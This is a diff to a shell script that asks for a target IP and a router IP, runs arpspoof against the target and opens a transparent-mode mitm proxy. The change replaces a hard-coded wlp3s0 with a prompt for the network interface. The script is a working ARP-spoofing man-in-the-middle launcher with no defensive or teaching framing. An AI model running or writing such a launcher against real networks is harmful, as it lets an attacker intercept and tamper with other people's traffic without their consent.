@@ -12,8 +12,10 @@ while [ "$net" = "" ]; do
     read net
     echo -n  "Enter router ip: "
     read net1
+    echo -n "Enter Wifi interface[wlan0|wlp3s0|eth0]: "
+    read interface
     if [ -n "$net" ]; then
-        arpspoof -i wlp3s0 -t $net $net1 &
+        arpspoof -i $interface -t $net $net1 &
         xterm -e "./mitm --mode transparent"
     fi
     killall arpspoof
